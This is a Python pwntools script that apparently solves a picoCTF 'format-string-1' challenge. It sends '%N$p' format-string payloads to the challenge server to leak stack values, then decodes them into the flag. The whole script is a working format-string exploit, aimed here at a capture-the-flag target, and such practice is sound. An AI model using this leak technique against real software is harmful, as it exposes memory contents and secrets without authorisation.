from pwn import *
exe = './format-string-1'
context.log_level = 'error'
host = 'mimas.picoctf.net'
port = 63577

flag = b''
for i in range(14, 20):
        # io = process(exe)
        io = remote(host, port)
        io.sendlineafter(b':', f'%{i}$p'.encode())
        io.recvuntil(b': ')
        try:
            leak = unhex(io.recvline()[2:].strip().decode())[::-1]
            print(leak, i)
            flag += leak
        except:
            BaseException
            pass

print(flag)
io.interactive()